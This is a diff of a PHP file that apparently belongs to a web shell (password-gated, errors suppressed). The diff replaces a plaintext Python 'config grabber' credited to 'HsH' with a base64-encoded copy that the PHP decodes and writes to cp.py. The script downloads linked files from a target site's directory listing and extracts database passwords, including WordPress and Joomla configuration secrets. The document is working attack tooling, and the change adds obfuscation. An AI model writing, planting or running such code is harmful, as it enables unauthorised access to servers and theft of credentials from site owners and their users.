@@ -94,191 +94,107 @@ if($_POST['pass']=='password'){
 error_reporting(0);
 mkdir('config',0755);
 $cp =
-
-
-
-
-
-
-
-
-
-
-
-
-
-#!/usr/bin/env python
-
-'''
-By:HsH
-'''
-
-import sys
-import os
-import re
-import subprocess
-import urllib
-import glob
-from platform import system
-
-if len(sys.argv) != 3:
-  print'''	
- Usage: %s [URL...] [directory...]
- Ex) %s http://www.test.com/test/ [dir ...]''' % (sys.argv[0], sys.argv[0])
-  sys.exit(1)
-
-site = sys.argv[1]
-fout = sys.argv[2]
-
-try:
-  req  = urllib.urlopen(site)
-  read = req.read()
-  if system() == 'Linux':
-    f = open('/tmp/data.txt', 'w')
-    f.write(read)
-    f.close()
-  if system() == 'Windows':
-    f = open('data.txt', 'w')  
-    f.write(read)
-    f.close()
-
-  i = 0
-  if system() == 'Linux':
-    f = open('/tmp/data.txt', 'rU')
-    for line in f:
-      if line.startswith('<li><a') == True :
-        m = re.search(r'(<a href=")(.+[^>])(">)', line)
-        i += 1
-        local_name = '%s/file%d.txt' % (fout, i)
-        print 'Retrieving...\t\t', site + m.group(2)
-        try:  urllib.urlretrieve(site + m.group(2), local_name)
-        except IOError:
-          print '\n[%s] doesn\'t exist, create it first' % fout
-          sys.exit()
-      if line.startswith('<img') == True:
-        m1 = re.search(r'(<a href=")(.+[^>])(">)', line)
-        i += 1
-        local_name = '%s/file%d.txt' % (fout, i)
-        print 'Retrieving...\t\t', site + m1.group(2)
-        try:  urllib.urlretrieve(site + m1.group(2), local_name)
-        except IOError:
-          print '\n[%s] doesn\'t exist, create it first' % fout
-          sys.exit()
-      if line.startswith('<IMG') == True:
-        m2 = re.search(r'(<A HREF=")(.+[^>])(">)', line)
-        i += 1
-        local_name = '%s/file%d.txt' % (fout, i)
-        print 'Retrieving...\t\t', site + m2.group(2)
-        try:  urllib.urlretrieve(site + m2.group(2), local_name)
-        except IOError:
-          print '\n[%s] doesn\'t exist, create it first' % fout
-          sys.exit()
-    f.close()
-  if system() == 'Windows':
-    f = open('data.txt', 'rU')
-    for line in f:
-      if line.startswith('<li><a') == True :
-        m = re.search(r'(<a href=")(.+[^>])(">)', line)
-        i += 1
-        local_name = '%s/file%d.txt' % (fout, i)
-        print 'Retrieving...\t\t', site + m.group(2)
-        try:  urllib.urlretrieve(site + m.group(2), local_name)
-        except IOError:
-          print '\n[%s] doesn\'t exist, create it first' % fout
-          sys.exit()
-      if line.startswith('<img') == True:
-        m1 = re.search(r'(<a href=")(.+[^>])(">)', line)
-        i += 1
-        local_name = '%s/file%d.txt' % (fout, i)
-        print 'Retrieving...\t\t', site + m1.group(2)
-        try:  urllib.urlretrieve(site + m1.group(2), local_name)
-        except IOError:
-          print '\n[%s] doesn\'t exist, create it first' % fout
-          sys.exit()
-      if line.startswith('<IMG') == True:
-        m2 = re.search(r'(<A HREF=")(.+[^>])(">)', line)
-        i += 1
-        local_name = '%s/file%d.txt' % (fout, i)
-        print 'Retrieving...\t\t', site + m2.group(2)
-        try:  urllib.urlretrieve(site + m2.group(2), local_name)
-        except IOError:
-          print '\n[%s] doesn\'t exist, create it first' % fout
-          sys.exit()
-    f.close()
-  if system() == 'Linux':
-    cleanup = subprocess.Popen('rm -rf /tmp/data.txt > /dev/null', shell=True).wait()
-  if system() == 'Windows':
-    cleanup = subprocess.Popen('del C:\data.txt', shell=True).wait()
-  print '\n', '-' * 100, '\n'
-  if system() == 'Linux':
-    for root, dirs, files in os.walk(fout):
-      for fname in files:
-        fullpath = os.path.join(root, fname)
-        f = open(fullpath, 'r')
-        for line in f:
-          secr = re.search (r"(db_password'] = ')(.+[^>])(';)", line)
-          if secr is not None: print (secr.group(2))  
-          secr1 = re.search(r"(password = ')(.+[^>])(';)", line)
-          if secr1 is not None:  print  (secr1.group(2))
-          secr2 = re.search(r"(DB_PASSWORD')(...)(.+[^>])(')", line)
-          if secr2 is not None: print (secr2.group(3))
-          secr3 = re.search (r"(dbpass =..)(.+[^>])(.;)", line)
-          if secr3 is not None: print (secr3.group(2))
-          secr4 = re.search (r"(DBPASSWORD = ')(.+[^>])(.;)", line)
-          if secr4 is not None: print (secr4.group(2))
-          secr5 = re.search (r"(DBpass = ')(.+[^>])(';)", line)
-          if secr5 is not None: print (secr5.group(2))
-          secr6 = re.search (r"(dbpasswd = ')(.+[^>])(';)", line)
-          if secr6 is not None: print (secr6.group(2))
-          secr7 = re.search (r"(mosConfig_password = ')(.+[^>])(';)", line)
-          if secr7 is not None: print (secr7.group(2))
-        f.close()
-  if system() == 'Windows':
-    for infile in glob.glob( os.path.join(fout, '*.txt') ):
-      f = open(infile, 'r')
-      for line in f:
-        secr = re.search (r"(db_password'] = ')(.+[^>])(';)", line)
-        if secr is not None: print (secr.group(2))  
-        secr1 = re.search(r"(password = ')(.+[^>])(';)", line)
-        if secr1 is not None:  print  (secr1.group(2))
-        secr2 = re.search(r"(DB_PASSWORD')(...)(.+[^>])(')", line)
-        if secr2 is not None: print (secr2.group(3))
-        secr3 = re.search (r"(dbpass =..)(.+[^>])(.;)", line)
-        if secr3 is not None: print (secr3.group(2))
-        secr4 = re.search (r"(DBPASSWORD = ')(.+[^>])(.;)", line)
-        if secr4 is not None: print (secr4.group(2))
-        secr5 = re.search (r"(DBpass = ')(.+[^>])(';)", line)
-        if secr5 is not None: print (secr5.group(2))
-        secr6 = re.search (r"(dbpasswd = ')(.+[^>])(';)", line)
-        if secr6 is not None: print (secr6.group(2))
-        secr7 = re.search (r"(mosConfig_password = ')(.+[^>])(';)", line)
-        if secr7 is not None: print (secr7.group(2))
-      f.close()
-except (KeyboardInterrupt):
-  print '\nThanks for using it ._^';
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgonJycKQnk6SHNICicnJwoKaW1wb3J0IHN5cwppbXBvcnQg
+b3MKaW1wb3J0IHJlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB1cmxsaWIKaW1wb3J0IGdsb2IK
+ZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCgppZiBsZW4oc3lzLmFyZ3YpICE9IDM6CiAgcHJp
+bnQnJycJCiBVc2FnZTogJXMgW1VSTC4uLl0gW2RpcmVjdG9yeS4uLl0KIEV4KSAlcyBodHRwOi8v
+d3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3Zb
+MF0pCiAgc3lzLmV4aXQoMSkKCnNpdGUgPSBzeXMuYXJndlsxXQpmb3V0ID0gc3lzLmFyZ3ZbMl0K
+CnRyeToKICByZXEgID0gdXJsbGliLnVybG9wZW4oc2l0ZSkKICByZWFkID0gcmVxLnJlYWQoKQog
+IGlmIHN5c3RlbSgpID09ICdMaW51eCc6CiAgICBmID0gb3BlbignL3RtcC9kYXRhLnR4dCcsICd3
+JykKICAgIGYud3JpdGUocmVhZCkKICAgIGYuY2xvc2UoKQogIGlmIHN5c3RlbSgpID09ICdXaW5k
+b3dzJzoKICAgIGYgPSBvcGVuKCdkYXRhLnR4dCcsICd3JykgIAogICAgZi53cml0ZShyZWFkKQog
+ICAgZi5jbG9zZSgpCgogIGkgPSAwCiAgaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKICAgIGYgPSBv
+cGVuKCcvdG1wL2RhdGEudHh0JywgJ3JVJykKICAgIGZvciBsaW5lIGluIGY6CiAgICAgIGlmIGxp
+bmUuc3RhcnRzd2l0aCgnPGxpPjxhJykgPT0gVHJ1ZSA6CiAgICAgICAgbSA9IHJlLnNlYXJjaChy
+Jyg8YSBocmVmPSIpKC4rW14+XSkoIj4pJywgbGluZSkKICAgICAgICBpICs9IDEKICAgICAgICBs
+b2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpCiAgICAgICAgcHJpbnQgJ1Jl
+dHJpZXZpbmcuLi5cdFx0Jywgc2l0ZSArIG0uZ3JvdXAoMikKICAgICAgICB0cnk6ICB1cmxsaWIu
+dXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpCiAgICAgICAgZXhjZXB0
+IElPRXJyb3I6CiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUg
+aXQgZmlyc3QnICUgZm91dAogICAgICAgICAgc3lzLmV4aXQoKQogICAgICBpZiBsaW5lLnN0YXJ0
+c3dpdGgoJzxpbWcnKSA9PSBUcnVlOgogICAgICAgIG0xID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9
+IikoLitbXj5dKSgiPiknLCBsaW5lKQogICAgICAgIGkgKz0gMQogICAgICAgIGxvY2FsX25hbWUg
+PSAnJXMvZmlsZSVkLnR4dCcgJSAoZm91dCwgaSkKICAgICAgICBwcmludCAnUmV0cmlldmluZy4u
+Llx0XHQnLCBzaXRlICsgbTEuZ3JvdXAoMikKICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmll
+dmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQogICAgICAgIGV4Y2VwdCBJT0Vycm9y
+OgogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0
+JyAlIGZvdXQKICAgICAgICAgIHN5cy5leGl0KCkKICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8
+SU1HJykgPT0gVHJ1ZToKICAgICAgICBtMiA9IHJlLnNlYXJjaChyJyg8QSBIUkVGPSIpKC4rW14+
+XSkoIj4pJywgbGluZSkKICAgICAgICBpICs9IDEKICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2Zp
+bGUlZC50eHQnICUgKGZvdXQsIGkpCiAgICAgICAgcHJpbnQgJ1JldHJpZXZpbmcuLi5cdFx0Jywg
+c2l0ZSArIG0yLmdyb3VwKDIpCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUg
+KyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAg
+ICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0
+CiAgICAgICAgICBzeXMuZXhpdCgpCiAgICBmLmNsb3NlKCkKICBpZiBzeXN0ZW0oKSA9PSAnV2lu
+ZG93cyc6CiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQogICAgZm9yIGxpbmUgaW4gZjoK
+ICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8bGk+PGEnKSA9PSBUcnVlIDoKICAgICAgICBtID0g
+cmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQogICAgICAgIGkgKz0g
+MQogICAgICAgIGxvY2FsX25hbWUgPSAnJXMvZmlsZSVkLnR4dCcgJSAoZm91dCwgaSkKICAgICAg
+ICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQogICAgICAgIHRy
+eTogIHVybGxpYi51cmxyZXRyaWV2ZShzaXRlICsgbS5ncm91cCgyKSwgbG9jYWxfbmFtZSkKICAg
+ICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhp
+c3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0CiAgICAgICAgICBzeXMuZXhpdCgpCiAgICAgIGlm
+IGxpbmUuc3RhcnRzd2l0aCgnPGltZycpID09IFRydWU6CiAgICAgICAgbTEgPSByZS5zZWFyY2go
+cicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpCiAgICAgICAgaSArPSAxCiAgICAgICAg
+bG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQogICAgICAgIHByaW50ICdS
+ZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQogICAgICAgIHRyeTogIHVybGxp
+Yi51cmxyZXRyaWV2ZShzaXRlICsgbTEuZ3JvdXAoMiksIGxvY2FsX25hbWUpCiAgICAgICAgZXhj
+ZXB0IElPRXJyb3I6CiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVh
+dGUgaXQgZmlyc3QnICUgZm91dAogICAgICAgICAgc3lzLmV4aXQoKQogICAgICBpZiBsaW5lLnN0
+YXJ0c3dpdGgoJzxJTUcnKSA9PSBUcnVlOgogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhS
+RUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQogICAgICAgIGkgKz0gMQogICAgICAgIGxvY2FsX25h
+bWUgPSAnJXMvZmlsZSVkLnR4dCcgJSAoZm91dCwgaSkKICAgICAgICBwcmludCAnUmV0cmlldmlu
+Zy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikKICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0
+cmlldmUoc2l0ZSArIG0yLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQogICAgICAgIGV4Y2VwdCBJT0Vy
+cm9yOgogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZp
+cnN0JyAlIGZvdXQKICAgICAgICAgIHN5cy5leGl0KCkKICAgIGYuY2xvc2UoKQogIGlmIHN5c3Rl
+bSgpID09ICdMaW51eCc6CiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3Blbigncm0gLXJmIC90
+bXAvZGF0YS50eHQgPiAvZGV2L251bGwnLCBzaGVsbD1UcnVlKS53YWl0KCkKICBpZiBzeXN0ZW0o
+KSA9PSAnV2luZG93cyc6CiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRh
+dGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpCiAgcHJpbnQgJ1xuJywgJy0nICogMTAwLCAnXG4n
+CiAgaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBv
+cy53YWxrKGZvdXQpOgogICAgICBmb3IgZm5hbWUgaW4gZmlsZXM6CiAgICAgICAgZnVsbHBhdGgg
+PSBvcy5wYXRoLmpvaW4ocm9vdCwgZm5hbWUpCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdy
+JykKICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgc2VjciA9IHJlLnNlYXJjaCAociIo
+ZGJfcGFzc3dvcmQnXSA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkKICAgICAgICAgIGlmIHNlY3Ig
+aXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgCiAgICAgICAgICBzZWNyMSA9IHJl
+LnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkKICAgICAgICAgIGlm
+IHNlY3IxIGlzIG5vdCBOb25lOiAgcHJpbnQgIChzZWNyMS5ncm91cCgyKSkKICAgICAgICAgIHNl
+Y3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkK
+ICAgICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpCiAg
+ICAgICAgICBzZWNyMyA9IHJlLnNlYXJjaCAociIoZGJwYXNzID0uLikoLitbXj5dKSguOykiLCBs
+aW5lKQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgy
+KSkKICAgICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5d
+KSguOykiLCBsaW5lKQogICAgICAgICAgaWYgc2VjcjQgaXMgbm90IE5vbmU6IHByaW50IChzZWNy
+NC5ncm91cCgyKSkKICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSgu
+K1tePl0pKCc7KSIsIGxpbmUpCiAgICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQg
+KHNlY3I1Lmdyb3VwKDIpKQogICAgICAgICAgc2VjcjYgPSByZS5zZWFyY2ggKHIiKGRicGFzc3dk
+ID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6
+IHByaW50IChzZWNyNi5ncm91cCgyKSkKICAgICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIiht
+b3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpCiAgICAgICAgICBpZiBz
+ZWNyNyBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I3Lmdyb3VwKDIpKQogICAgICAgIGYuY2xvc2Uo
+KQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoKICAgIGZvciBpbmZpbGUgaW4gZ2xvYi5nbG9i
+KCBvcy5wYXRoLmpvaW4oZm91dCwgJyoudHh0JykgKToKICAgICAgZiA9IG9wZW4oaW5maWxlLCAn
+cicpCiAgICAgIGZvciBsaW5lIGluIGY6CiAgICAgICAgc2VjciA9IHJlLnNlYXJjaCAociIoZGJf
+cGFzc3dvcmQnXSA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkKICAgICAgICBpZiBzZWNyIGlzIG5v
+dCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIAogICAgICAgIHNlY3IxID0gcmUuc2VhcmNo
+KHIiKHBhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQogICAgICAgIGlmIHNlY3IxIGlz
+IG5vdCBOb25lOiAgcHJpbnQgIChzZWNyMS5ncm91cCgyKSkKICAgICAgICBzZWNyMiA9IHJlLnNl
+YXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpCiAgICAgICAgaWYg
+c2VjcjIgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMi5ncm91cCgzKSkKICAgICAgICBzZWNyMyA9
+IHJlLnNlYXJjaCAociIoZGJwYXNzID0uLikoLitbXj5dKSguOykiLCBsaW5lKQogICAgICAgIGlm
+IHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpCiAgICAgICAgc2VjcjQg
+PSByZS5zZWFyY2ggKHIiKERCUEFTU1dPUkQgPSAnKSguK1tePl0pKC47KSIsIGxpbmUpCiAgICAg
+ICAgaWYgc2VjcjQgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNC5ncm91cCgyKSkKICAgICAgICBz
+ZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQogICAg
+ICAgIGlmIHNlY3I1IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjUuZ3JvdXAoMikpCiAgICAgICAg
+c2VjcjYgPSByZS5zZWFyY2ggKHIiKGRicGFzc3dkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQog
+ICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpCiAgICAg
+ICAgc2VjcjcgPSByZS5zZWFyY2ggKHIiKG1vc0NvbmZpZ19wYXNzd29yZCA9ICcpKC4rW14+XSko
+JzspIiwgbGluZSkKICAgICAgICBpZiBzZWNyNyBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I3Lmdy
+b3VwKDIpKQogICAgICBmLmNsb3NlKCkKZXhjZXB0IChLZXlib2FyZEludGVycnVwdCk6CiAgcHJp
+bnQgJ1xuVGhhbmtzIGZvciB1c2luZyBpdCAuX14n';
 $file = fopen("cp.py","w+");
 $write = fwrite ($file ,base64_decode($cp));
 fclose($file);
